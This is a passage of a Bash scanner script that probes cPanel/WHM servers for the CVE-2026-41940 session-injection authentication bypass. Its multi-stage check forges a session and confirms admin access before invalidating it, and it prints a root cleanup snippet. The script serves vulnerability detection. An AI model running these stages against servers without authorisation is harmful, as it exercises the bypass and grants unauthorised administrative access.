    # a target with 0 conclusive probes.
    if [[ -z "${TARGET_VERDICT[$host]:-}" ]]; then
      TARGET_ORDER+=("$host")
    fi
  fi
  emit_probe_line "$desc" "$verdict" "$detail" "$http" "$loc" "$sch" "$host" "$port" "$hh"
}

# === Single-probe runner ===
probe_target() {
  local scheme=$1 host=$2 port=$3 host_hdr=$4 desc=$5
  local url; url=$(build_url "$scheme" "$host" "$port")
  local effective_hdr="$host_hdr"

  # auto-discover canonical Host (only if requested and not already set)
  if [[ "$AUTO_DISCOVER_HOST" = "1" ]] && [[ -z "$effective_hdr" ]]; then
    local canon; canon=$(discover_canonical "$url")
    [[ -n "$canon" ]] && effective_hdr="$canon" && log_v "[$desc] auto-discovered canonical Host: ${effective_hdr}"
  fi

  # Proxy-domain mode: when an explicit host_hdr differs from the URL host,
  # rebuild the URL using the hostname and pin DNS to the original IP via
  # curl --resolve. Apache 2.4 + HTTP/2 enforces SNI = Host strictly and
  # returns 421 Misdirected Request if they disagree, which the bare
  # `-H "Host: ..."` approach trips. The resolve pin makes curl present the
  # right SNI while still hitting the target IP.
  local resolve_pin=""
  if [[ -n "$effective_hdr" ]] && [[ "$effective_hdr" != "$host" ]]; then
    local effective_port="${port:-443}"
    [[ "$scheme" = "http" ]] && effective_port="${port:-80}"
    url=$(build_url "$scheme" "$effective_hdr" "$effective_port")
    resolve_pin="${effective_hdr}:${effective_port}:${host}"
    log_v "[$desc] resolve pin: ${resolve_pin}"
  fi

  log_v "[$desc] target: ${url}"
  log_v "[$desc] Host header: ${effective_hdr:-<URL hostname>}"

  # Stage 1 - returns "<reason>|<cookie>"
  local s1_result s1_reason cookie
  s1_result=$(mint_preauth "$url" "$effective_hdr" "$resolve_pin")
  s1_reason="${s1_result%%|*}"
  cookie="${s1_result#*|}"
  log_v "[$desc] stage 1 reason: ${s1_reason}"
  log_v "[$desc] stage 1 cookie: ${cookie}"

  if [[ "$s1_reason" != "ok" ]]; then
    local detail verdict="$V_INCONCLUSIVE"
    case "$s1_reason" in
      dns_failed)         detail="stage 1 - DNS resolution failed" ;;
      connect_refused)    detail="stage 1 - TCP refused (cpsrvd not listening on this port)" ;;
      connect_timeout)    detail="stage 1 - TCP timeout (port firewalled or host unreachable)" ;;
      tls_failed)         detail="stage 1 - TLS handshake failed" ;;
      http_421)           detail="stage 1 - HTTP 421 Misdirected (SNI/Host mismatch; try --auto-host-discover)" ;;
      redirect_to_ssl)
        # cpsrvd's "force HTTPS" config - this surface just redirects to its
        # SSL counterpart, which is the same daemon. SKIP, not INCONC.
        verdict="$V_SKIP"
        detail="redirected to ${cookie} - see paired SSL probe"
        ;;
      http_*_no_cookie)
        local _code="${s1_reason#http_}"; _code="${_code%_no_cookie}"
        detail="stage 1 - HTTP ${_code}; no whostmgrsession (response not from cpsrvd?)"
        ;;
      transport_*)        detail="stage 1 - curl transport failure (${s1_reason})" ;;
      *)                  detail="stage 1 - ${s1_reason}" ;;
    esac
    record_result "$desc" "$url" "$verdict" "$detail" "" "" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi

  # ob_part strip
  local session_base="${cookie%%,*}"
  if [[ "$session_base" = "$cookie" ]]; then
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 1 - cookie has no ob_part (unusual cpsrvd configuration)" "" "" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi
  log_v "[$desc] session_base (ob-stripped): ${session_base}"

  # Stage 2
  local result status loc
  result=$(inject_probe "$url" "$effective_hdr" "$session_base" "$resolve_pin")
  if [[ -z "$result" ]]; then
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 2 - curl transport failure" "" "" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi
  status="${result%%|*}"; loc="${result#*|}"
  log_v "[$desc] stage 2 HTTP: ${status:-<none>}"
  log_v "[$desc] stage 2 Location: ${loc:-<none>}"

  # Stage 2 must produce 307 + /cpsess<10>/ for the bypass to be possible.
  # Anything else is a definitive SAFE (or a transport edge case).
  local cpsess=""
  if [[ "$status" = "307" ]] && echo "$loc" | grep -qE '/cpsess[0-9]{10}'; then
    cpsess=$(echo "$loc" | grep -oE '/cpsess[0-9]{10}' | head -1)
  elif [[ "$status" = "401" ]] || [[ "$status" = "403" ]]; then
    record_result "$desc" "$url" "$V_SAFE" "HTTP ${status} at stage 2; no /cpsess leak" "$status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
    return
  elif [[ -z "$status" ]]; then
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 2 - no HTTP status received" "" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
    return
  else
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 2 HTTP ${status}; no /cpsess leak - manual review" "$status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi

  # --no-verify: stop at stage 2 (v1 heuristic; produces false positives on
  # patched hosts because cpsrvd 307s any cookie-bearing request to /cpsess/)
  if [[ "$NO_VERIFY" = "1" ]]; then
    record_result "$desc" "$url" "$V_VULN" "HTTP 307; leaked ${cpsess} (stage-2 only - may false-positive)" "$status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi

  # Stage 3 - propagate raw → cache so stage 4 can read the injected session
  local s3_status
  s3_status=$(propagate_session "$url" "$effective_hdr" "$session_base" "$resolve_pin")
  log_v "[$desc] stage 3 HTTP: ${s3_status:-<none>}"

  # Stage 4 - verify the leaked cpsess actually grants session access
  local s4_result s4_status s4_body
  s4_result=$(verify_session "$url" "$effective_hdr" "$session_base" "$cpsess" "$resolve_pin")
  if [[ -z "$s4_result" ]]; then
    # Stage 5 cleanup even if stage 4 failed (session may still be live)
    invalidate_session "$url" "$effective_hdr" "$session_base" "$cpsess" "$resolve_pin"
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 4 - curl transport failure (session left live; auto-expires)" "$status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
    return
  fi
  s4_status="${s4_result%%|*}"; s4_body="${s4_result#*|}"
  log_v "[$desc] stage 4 HTTP: ${s4_status:-<none>}"
  log_v "[$desc] stage 4 body: ${s4_body}"

  # Stage 5 - invalidate the forged session (best-effort)
  invalidate_session "$url" "$effective_hdr" "$session_base" "$cpsess" "$resolve_pin"

  # Verdict on stage-4 result
  if [[ "$s4_status" = "200" ]]; then
    record_result "$desc" "$url" "$V_VULN" "HTTP 307→${cpsess}; verify HTTP 200 (bypass landed; session invalidated)" "$s4_status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
  elif [[ "$s4_status" = "500" || "$s4_status" = "503" ]] && echo "$s4_body" | grep -qi 'license'; then
    record_result "$desc" "$url" "$V_VULN" "HTTP 307→${cpsess}; verify HTTP ${s4_status} (license-gated past auth)" "$s4_status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
  elif [[ "$s4_status" = "401" ]] || [[ "$s4_status" = "403" ]]; then
    record_result "$desc" "$url" "$V_SAFE" "HTTP 307 was URL canonicalization; verify HTTP ${s4_status} (bypass blocked)" "$s4_status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
  elif [[ -z "$s4_status" ]]; then
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 4 - no HTTP status received" "" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
  else
    record_result "$desc" "$url" "$V_INCONCLUSIVE" "stage 4 HTTP ${s4_status}; manual review" "$s4_status" "$loc" "$scheme" "$host" "$port" "$effective_hdr"
  fi
}

# === Permutation runners ===
probe_direct_ports_whm() {
  local target=$1
  for tuple in "2087:https:WHM-SSL" "2086:http:WHM"; do
    local port="${tuple%%:*}"; local rest="${tuple#*:}"
    local sch="${rest%%:*}";  local label="${rest#*:}"
    probe_target "$sch" "$target" "$port" "" "DIRECT-${label}@${target}:${port}"
  done
}

probe_direct_ports_all() {
  # Note: cPanel/Webmail probes use the WHM cookie name (whostmgrsession) so
  # they will INCONCLUSIVE on those ports - those daemons issue cpsession=
  # and webmailsession= respectively. The watchTowr public PoC is WHM-only.
  local target=$1
  for tuple in \
      "2087:https:WHM-SSL" "2086:http:WHM" \
      "2083:https:cPanel-SSL" "2082:http:cPanel" \
      "2096:https:Webmail-SSL" "2095:http:Webmail"
  do
    local port="${tuple%%:*}"; local rest="${tuple#*:}"
    local sch="${rest%%:*}";  local label="${rest#*:}"
    probe_target "$sch" "$target" "$port" "" "DIRECT-${label}@${target}:${port}"
  done
}

probe_proxy_subdomains() {
  local target=$1 proxy_domain=$2
  for sub in whm cpanel webmail; do
    local hdr="${sub}.${proxy_domain}"
    probe_target "https" "$target" "443" "$hdr" "PROXY-${sub}-SSL@${hdr}"
    probe_target "http"  "$target" "80"  "$hdr" "PROXY-${sub}-HTTP@${hdr}"
  done
}

# === JSON output ===
json_escape() {
  local s=$1
  s="${s//\\/\\\\}"; s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"; s="${s//$'\r'/\\r}"; s="${s//$'\t'/\\t}"
  printf '%s' "$s"
}

emit_json() {
  local n=${#R_DESC[@]} i first
  printf '{\n'
  printf '  "tool": "sessionscribe-remote-probe.sh",\n'
  printf '  "version": "%s",\n' "$SCRIPT_VERSION"
  printf '  "cve": "CVE-2026-41940",\n'
  printf '  "ran_at": "%s",\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf '  "probe_nonce": "%s",\n' "$NONCE"
  printf '  "probe_canary": "%s",\n' "$CANARY"
  printf '  "no_verify": %s,\n' "$([ "$NO_VERIFY" = 1 ] && echo true || echo false)"
  printf '  "summary": {"vuln":%d,"safe":%d,"inconclusive":%d,"total":%d},\n' \
    "$N_VULN" "$N_SAFE" "$N_INC" "$N_TOTAL"
  printf '  "targets": [\n'
  first=1
  for host in "${TARGET_ORDER[@]}"; do
    [[ $first -eq 0 ]] && printf ',\n'; first=0
    printf '    {"host": "%s", "verdict": "%s"}' \
      "$(json_escape "$host")" "${TARGET_VERDICT[$host]}"
  done
  printf '\n  ],\n'
  printf '  "probes": [\n'
  first=1
  for ((i=0; i<n; i++)); do
    [[ $first -eq 0 ]] && printf ',\n'; first=0
    printf '    {"description": "%s", "target": "%s", "scheme": "%s", "host": "%s", "port": "%s", "host_header": "%s", "verdict": "%s", "http_code": "%s", "location": "%s", "detail": "%s"}' \
      "$(json_escape "${R_DESC[$i]}")" \
      "$(json_escape "${R_TARGET[$i]}")" \
      "$(json_escape "${R_SCHEME[$i]}")" \
      "$(json_escape "${R_HOST[$i]}")" \
      "$(json_escape "${R_PORT[$i]}")" \
      "$(json_escape "${R_HOSTHDR[$i]}")" \
      "$(json_escape "${R_VERDICT[$i]}")" \
      "$(json_escape "${R_HTTPCODE[$i]}")" \
      "$(json_escape "${R_LOCATION[$i]}")" \
      "$(json_escape "${R_DETAIL[$i]}")"
  done
  printf '\n  ]\n'
  printf '}\n'
}

emit_csv_header() {
  printf 'host,description,scheme,host_header,port,verdict,http_code,location,detail\n'
}

emit_oneline() {
  # one verdict line per target (using TARGET_VERDICT rollup)
  for host in "${TARGET_ORDER[@]}"; do
    local verdict="${TARGET_VERDICT[$host]}"
    local n=0; local i
    for ((i=0; i<${#R_DESC[@]}; i++)); do
      [[ "${R_HOST[$i]}" = "$host" ]] && [[ "${R_VERDICT[$i]}" = "$verdict" ]] && n=$((n+1))
    done
    case "$verdict" in
      "$V_VULN")          printf '%s%s%s: %sVULN%s n=%d\n'         "$BOLD" "$host" "$NC" "$RED"    "$NC" "$n" ;;
      "$V_SAFE")          printf '%s%s%s: %sSAFE%s n=%d\n'         "$BOLD" "$host" "$NC" "$GREEN"  "$NC" "$n" ;;
      "$V_INCONCLUSIVE")  printf '%s%s%s: %sINCONCLUSIVE%s n=%d\n' "$BOLD" "$host" "$NC" "$YELLOW" "$NC" "$n" ;;
    esac
  done
}

# === Final summary (text/quiet modes) ===
emit_summary() {
  local total=$N_TOTAL vuln=$N_VULN safe=$N_SAFE inc=$N_INC
  local n_targets=${#TARGET_ORDER[@]}
  local t_vuln=0 t_safe=0 t_inc=0
  for host in "${TARGET_ORDER[@]}"; do
    case "${TARGET_VERDICT[$host]}" in
      "$V_VULN")         t_vuln=$((t_vuln+1)) ;;
      "$V_SAFE")         t_safe=$((t_safe+1)) ;;
      "$V_INCONCLUSIVE") t_inc=$((t_inc+1)) ;;
    esac
  done

  if [[ "$OUTPUT_MODE" = "text" ]]; then
    printf '\n  %s%s%s\n' "$DIM" "$RULE_SINGLE" "$NC"
    printf '  %sProbes%s     %s%d vuln%s · %s%d safe%s · %s%d inconc%s' \
      "$BOLD" "$NC" "$RED" "$vuln" "$NC" "$GREEN" "$safe" "$NC" "$YELLOW" "$inc" "$NC"
    [[ $N_SKIP -gt 0 ]] && printf ' · %s%d skip%s' "$DIM" "$N_SKIP" "$NC"
    printf ' · %d total\n' "$total"
    printf '  %sTargets%s    %s%d vuln%s · %s%d safe%s · %s%d inconc%s · %d total\n' \
      "$BOLD" "$NC" "$RED" "$t_vuln" "$NC" "$GREEN" "$t_safe" "$NC" "$YELLOW" "$t_inc" "$NC" "$n_targets"
    printf '  %s%s%s\n' "$DIM" "$RULE_SINGLE" "$NC"
  fi

  # Verdict line (printed in text + quiet) - based on TARGET rollup, not
  # probe-level counts. A target with one SAFE + one INCONC is patched.
  if [[ "$OUTPUT_MODE" = "text" || "$OUTPUT_MODE" = "quiet" ]]; then
    local vlabel vcolor
    if   [[ $t_vuln -gt 0 ]]; then vlabel="VULNERABLE";   vcolor="$RED"
    elif [[ $t_safe -gt 0 ]] && [[ $t_inc -eq 0 ]]; then vlabel="CLEAN";        vcolor="$GREEN"
    elif [[ $t_safe -gt 0 ]] && [[ $t_inc -gt 0 ]]; then vlabel="MIXED";        vcolor="$YELLOW"
    else                                              vlabel="INCONCLUSIVE"; vcolor="$YELLOW"
    fi
    if [[ "$OUTPUT_MODE" = "text" ]]; then
      printf '\n  %s%s%s %sVERDICT%s   %s%s%s' \
        "$vcolor" "$BAR" "$NC" "$BOLD" "$NC" "$vcolor" "$vlabel" "$NC"
      [[ $vuln -gt 0 ]] && printf '   (%d / %d targets exploitable)' "$t_vuln" "$n_targets"
      printf '\n'
    else
      printf '\n %sVerdict:%s %s%s%s' "$BOLD" "$NC" "$vcolor" "$vlabel" "$NC"
      [[ $vuln -gt 0 ]] && printf '  (%d/%d targets exploitable)' "$t_vuln" "$n_targets"
      printf '\n'
    fi
  fi

  # Operator pointers (text mode only, when VULN found).
  # The probe actively invalidates each forged session via stage 5 logout;
  # any survivor expires on cpsrvd's natural ~30 min idle timeout. For
  # immediate session-file removal, --cleanup emits the wildcard remover.
  if [[ "$OUTPUT_MODE" = "text" ]] && [[ $vuln -gt 0 ]]; then
    if [[ "$NO_VERIFY" = "1" ]]; then
      printf '\n  %s%s%s  --no-verify mode: VULN verdict is stage-2 heuristic only.\n' \
        "$YELLOW" "$ICON_INC" "$NC"
      printf '       Re-run without --no-verify for deterministic stage-4 verification.\n'
    else
      printf '\n  %sCleanup%s    Run %s%s --cleanup%s as root on each VULN target.\n' \
        "$BOLD" "$NC" "$DIM" "$0" "$NC"
    fi
  fi
}

# === Argument parsing ===
parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      --target)             shift; TARGETS+=("$1") ;;
      --all|--all-permutations) ALL_PERMUTATIONS=1 ;;
      --proxy|--proxy-domain) shift; PROXY_DOMAIN="$1" ;;
      --port)               shift; FORCED_PORT="$1" ;;
      --host-header)        shift; FORCED_HOST_HEADER="$1" ;;
      --scheme)             shift; FORCED_SCHEME="$1" ;;
      --auto-host-discover) AUTO_DISCOVER_HOST=1 ;;
      --timeout)            shift; TIMEOUT="$1" ;;
      --connect-timeout)    shift; CONNECT_TIMEOUT="$1" ;;
      --json)               OUTPUT_MODE="json" ;;
      --csv)                OUTPUT_MODE="csv" ;;
      --oneline)            OUTPUT_MODE="oneline" ;;
      -q|--quiet)           OUTPUT_MODE="quiet" ;;
      --no-color)           NO_COLOR_FLAG=1 ;;
      --no-progress)        PROGRESS=0 ;;
      --no-verify)          NO_VERIFY=1 ;;
      --cleanup)            EMIT_CLEANUP=1 ;;
      -v|--verbose)         VERBOSE=1 ;;
      -h|--help)            init_colors; usage; exit 0 ;;
      --)
        while IFS= read -r line; do
          line="${line%%#*}"
          line="${line#"${line%%[![:space:]]*}"}"
          line="${line%"${line##*[![:space:]]}"}"
          [ -n "$line" ] && TARGETS+=("$line")
        done
        ;;
      -*)                   log_w "unknown option: $1"; init_colors; usage; exit 64 ;;
      *)                    TARGETS+=("$1") ;;
    esac
    shift
  done
}

main() {
  parse_args "$@"
  init_colors

  # --cleanup: emit local cleanup command and exit. No probing, no targets
  # required, no banner. Output is a self-contained shell snippet that
  # operators can pipe through ssh or paste into a root shell on each
  # formerly-VULN target. Matches the wildcard `nxesec_canary_*` so it
  # cleans sessions left by ANY past probe run (any nonce).
  if [[ "$EMIT_CLEANUP" = "1" ]]; then
    cat <<'CLEANUP_EOF'
# sessionscribe-remote-probe cleanup - removes session files left by past probe runs.
# Matches nxesec_canary_* (all probe nonces). Run as root on each target.
grep -l "nxesec_canary_" \
     /var/cpanel/sessions/raw/* \
     /var/cpanel/sessions/cache/* \
     /var/cpanel/sessions/preauth/* 2>/dev/null \
  | while read f; do
      n=$(basename "$f")
      rm -f "/var/cpanel/sessions/raw/$n" \
            "/var/cpanel/sessions/cache/$n" \
            "/var/cpanel/sessions/preauth/$n"
    done
CLEANUP_EOF
    exit 0
  fi

  # csv/json/oneline disable color in their bodies anyway, but quiet keeps color
  case "$OUTPUT_MODE" in
    csv|json|oneline) RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; DIM=''; NC='' ;;
  esac

  if [ "${#TARGETS[@]}" -eq 0 ]; then
    init_colors; usage; exit 64
  fi

  # CSV header (must come before probes for streamability)
  [[ "$OUTPUT_MODE" = "csv" ]] && emit_csv_header

  # Banner (text mode only)
  if [[ "$OUTPUT_MODE" = "text" ]]; then
    printf '\n  %s%s%s\n' "$BOLD" "$RULE_DOUBLE" "$NC"
    printf '  %ssessionscribe-remote-probe.sh  v%s       CVE-2026-41940 · SessionScribe%s\n' \
      "$BOLD" "$SCRIPT_VERSION" "$NC"
    printf '  %s%s%s\n' "$BOLD" "$RULE_DOUBLE" "$NC"
    printf '  %sProbe-ID%s   %s\n'  "$DIM" "$NC" "$NONCE"
    printf '  %sStarted%s    %s\n'  "$DIM" "$NC" "$(date -u '+%Y-%m-%d %H:%M:%S UTC')"
    printf '  %sTargets%s    %d\n'  "$DIM" "$NC" "${#TARGETS[@]}"
    if [[ "$NO_VERIFY" = "1" ]]; then
      printf '  %sMode%s       %s--no-verify (stage-2 heuristic; FALSE POSITIVES on patched hosts)%s\n' \
        "$DIM" "$NC" "$YELLOW" "$NC"
    fi
  fi

  local idx=0 total_t=${#TARGETS[@]}
  for target in "${TARGETS[@]}"; do
    idx=$((idx+1))
    if [[ "$OUTPUT_MODE" = "text" ]]; then
      box_top "$target"
    fi

    if [[ "$ALL_PERMUTATIONS" = "1" ]]; then
      probe_direct_ports_all "$target"
      [[ -n "$PROXY_DOMAIN" ]] && probe_proxy_subdomains "$target" "$PROXY_DOMAIN"
    elif [[ -n "$PROXY_DOMAIN" ]]; then
      probe_proxy_subdomains "$target" "$PROXY_DOMAIN"
    elif [[ -n "$FORCED_PORT" ]]; then
      local sch="${FORCED_SCHEME:-https}"
      # Map common cpsrvd ports to canonical role labels for the role column
      local role
      case "$FORCED_PORT" in
        2087) role="WHM-SSL"      ;;
        2086) role="WHM"          ;;
        2083) role="cPanel-SSL"   ;;
        2082) role="cPanel"       ;;
        2096) role="Webmail-SSL"  ;;
        2095) role="Webmail"      ;;
        *)    role="${sch}"       ;;
      esac
      probe_target "$sch" "$target" "$FORCED_PORT" "$FORCED_HOST_HEADER" \
        "DIRECT-${role}@${target}:${FORCED_PORT}"
    else
      probe_direct_ports_whm "$target"
    fi

    if [[ "$OUTPUT_MODE" = "text" ]]; then
      box_bottom
    fi
  done

  # Output finalization per mode
  case "$OUTPUT_MODE" in
    json)    emit_json ;;
    oneline) emit_oneline ;;
    csv)     : ;;  # rows already emitted
    text|quiet) emit_summary ;;
  esac

  # Exit code - based on TARGET-level rollup
  local et_vuln=0 et_inc=0 et_safe=0
  for h in "${TARGET_ORDER[@]}"; do
    case "${TARGET_VERDICT[$h]}" in
      "$V_VULN")         et_vuln=$((et_vuln+1)) ;;
      "$V_SAFE")         et_safe=$((et_safe+1)) ;;
      "$V_INCONCLUSIVE") et_inc=$((et_inc+1)) ;;
    esac
  done
  if [[ $et_vuln -gt 0 ]]; then exit 2; fi
  if [[ $et_safe -eq 0 ]] && [[ $et_inc -gt 0 ]]; then exit 1; fi
  exit 0
}

main "$@"
